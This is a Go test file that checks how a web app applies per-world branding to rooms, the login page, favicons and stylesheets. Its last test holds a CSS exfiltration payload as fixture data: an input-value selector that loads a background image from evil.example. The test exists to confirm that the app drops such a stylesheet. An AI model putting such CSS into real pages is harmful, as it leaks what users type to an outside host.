package web

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/labstack/echo/v5"
	"github.com/latebit-io/demarkus-library/internal/core/domain"
)

const hubWorld = "root"

// hubSvc is a reading fake whose hub world publishes room branding, favicon
// included; every other world declares nothing.
func hubSvc() *fakeReading {
	svc := inWorldSvc("# Logo\n\nThe mark.\n\n```svg\n<svg xmlns='http://www.w3.org/2000/svg'/>\n```\n")
	svc.raws[WorldBrandFavicon] = domain.RawDocument{Body: fencedLogo("svg", "", "<svg xmlns='http://www.w3.org/2000/svg' id='fav'/>")}
	svc.rawsWorld = hubWorld
	return svc
}

func hubApp(t *testing.T, svc *fakeReading) (*echo.Echo, *WorldBrands) {
	t.Helper()
	app := echo.New()
	view, err := NewView()
	if err != nil {
		t.Fatalf("NewView: %v", err)
	}
	branding, err := ThemeRoutes(app, ThemeManifest{Name: "ACME Brain"})
	if err != nil {
		t.Fatalf("ThemeRoutes: %v", err)
	}
	brands := NewWorldBrands(svc).WithHub(hubWorld)
	app.Renderer = view.WithBranding(branding).WithWorldBrands(brands)
	WorldThemeRoutes(app, branding, brands)
	RoomRoutes(app, NewRoom(svc, "soul.demarkus.io", "/index.md").WithBranding(branding))
	return app, brands
}

func TestHubDocumentsBrandTheRoom(t *testing.T) {
	app, _ := hubApp(t, hubSvc())
	// A page on another world: the hub's identity is the room's.
	rec := get(app, "/t/soul.demarkus.io/d/x.md")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	body := rec.Body.String()
	for _, want := range []string{
		"<title>X — Soul Room</title>",
		`<link rel="icon" href="/theme/worlds/root/favicon">`,
		`<link rel="stylesheet" href="/theme/worlds/root/site.css">`,
		`<img src="/theme/worlds/root/logo"`,
	} {
		if !strings.Contains(body, want) {
			t.Errorf("page missing %q", want)
		}
	}
	// The hub in focus links its sheet once, from the head, not again from the body.
	rec = get(app, "/t/root/d/x.md")
	if n := strings.Count(rec.Body.String(), "/theme/worlds/root/site.css"); n != 1 {
		t.Errorf("hub sheet linked %d times, want 1", n)
	}
	rec = get(app, "/theme/worlds/root/favicon")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Header().Get("Content-Type"), "svg") || !strings.Contains(rec.Body.String(), "fav") {
		t.Errorf("favicon: %d %q", rec.Code, rec.Body.String())
	}
}

// A manifest stylesheet for the hub world still links from the body when the
// hub publishes no sheet of its own: only the hub's own sheet is in the head.
func TestHubKeepsManifestWorldSheetWhenSilent(t *testing.T) {
	svc := inWorldSvc("")
	delete(svc.raws, WorldBrandCSS)
	svc.rawsWorld = hubWorld
	dir := t.TempDir()
	css := filepath.Join(dir, "root.css")
	if err := os.WriteFile(css, []byte(":root { --paper: #123456; }"), 0o600); err != nil {
		t.Fatal(err)
	}
	app := echo.New()
	view, err := NewView()
	if err != nil {
		t.Fatalf("NewView: %v", err)
	}
	branding, err := ThemeRoutes(app, ThemeManifest{Name: "ACME Brain", Worlds: map[string]WorldTheme{hubWorld: {CSS: css}}})
	if err != nil {
		t.Fatalf("ThemeRoutes: %v", err)
	}
	brands := NewWorldBrands(svc).WithHub(hubWorld)
	app.Renderer = view.WithBranding(branding).WithWorldBrands(brands)
	WorldThemeRoutes(app, branding, brands)
	RoomRoutes(app, NewRoom(svc, "soul.demarkus.io", "/index.md").WithBranding(branding))
	rec := get(app, "/t/root/d/x.md")
	body := rec.Body.String()
	if !strings.Contains(body, "<title>X — Soul Room</title>") {
		t.Error("hub name missing")
	}
	head := strings.Index(body, "</head>")
	link := strings.Index(body, `<link rel="stylesheet" href="/theme/worlds/root/site.css">`)
	if link < 0 || link < head {
		t.Error("manifest sheet for the hub world not linked from the body")
	}
}

func TestHubBrandsTheLoginPage(t *testing.T) {
	rig := newTestRig(t)
	view, err := NewView()
	if err != nil {
		t.Fatalf("NewView: %v", err)
	}
	rig.app.Renderer = view.WithWorldBrands(NewWorldBrands(hubSvc()).WithHub(hubWorld))
	rec := rig.do(httptest.NewRequest(http.MethodGet, "/login", http.NoBody))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	body := rec.Body.String()
	for _, want := range []string{
		"<title>Sign in — Soul Room</title>",
		`<link rel="stylesheet" href="/theme/worlds/root/site.css">`,
		`<img class="brand-logo" src="/theme/worlds/root/logo"`,
		`<link rel="icon" href="/theme/worlds/root/favicon">`,
	} {
		if !strings.Contains(body, want) {
			t.Errorf("login missing %q", want)
		}
	}
}

func TestNoHubKeepsFileBranding(t *testing.T) {
	svc := hubSvc()
	app := echo.New()
	view, err := NewView()
	if err != nil {
		t.Fatalf("NewView: %v", err)
	}
	branding, err := ThemeRoutes(app, ThemeManifest{Name: "ACME Brain"})
	if err != nil {
		t.Fatalf("ThemeRoutes: %v", err)
	}
	app.Renderer = view.WithBranding(branding).WithWorldBrands(NewWorldBrands(svc))
	RoomRoutes(app, NewRoom(svc, "soul.demarkus.io", "/index.md").WithBranding(branding))
	rec := get(app, "/t/soul.demarkus.io/d/x.md")
	if !strings.Contains(rec.Body.String(), "<title>X — ACME Brain</title>") {
		t.Error("hub documents applied without a configured hub")
	}
}

// A read that fails for a reason other than absence keeps the last resolved
// brand: the login page reads without a session, and must not blank a
// private hub's identity for a TTL.
func TestWorldBrandsKeepLastGoodOnReadFailure(t *testing.T) {
	svc := hubSvc()
	brands := NewWorldBrands(svc).WithHub(hubWorld)
	now := time.Unix(0, 0)
	brands.now = func() time.Time { return now }
	if r, ok := brands.Room(context.Background()); !ok || r.Name != "Soul Room" {
		t.Fatalf("initial resolve: %+v %v", r, ok)
	}
	svc.raws, svc.err = nil, domain.ErrUnauthorized
	now = now.Add(worldBrandTTL + time.Second)
	if r, ok := brands.Room(context.Background()); !ok || r.Name != "Soul Room" {
		t.Errorf("brand lost on a denied read: %+v %v", r, ok)
	}
	// Absence, by contrast, replaces what was there.
	svc.raws, svc.err = map[string]domain.RawDocument{}, nil
	now = now.Add(worldBrandTTL + time.Second)
	if _, ok := brands.Room(context.Background()); ok {
		t.Error("removed branding still resolved")
	}
	// A failure with nothing good before it is cached as absence.
	fresh := NewWorldBrands(&fakeReading{err: domain.ErrUnauthorized}).WithHub(hubWorld)
	if _, ok := fresh.Room(context.Background()); ok {
		t.Error("denied first read reported a brand")
	}
}

func TestInWorldUnsafeStylesheetIsDropped(t *testing.T) {
	svc := inWorldSvc("")
	svc.raws[WorldBrandCSS] = domain.RawDocument{Body: "# Stylesheet\n\nLeaky.\n\n```css\ninput[value^=a] { background: url(https://evil.example/a); }\n```\n"}
	brands := NewWorldBrands(svc)
	r, ok := brands.For(context.Background(), "w")
	if !ok || r.Name != "Soul Room" {
		t.Fatalf("name lost with the stylesheet: %+v", r)
	}
	if r.CSSURL != "" {
		t.Errorf("unsafe stylesheet served: %q", r.CSSURL)
	}
	if desk := brands.Desk(context.Background(), "w"); desk.CSS != "" {
		t.Errorf("unsafe stylesheet offered back to the desk: %q", desk.CSS)
	}
}
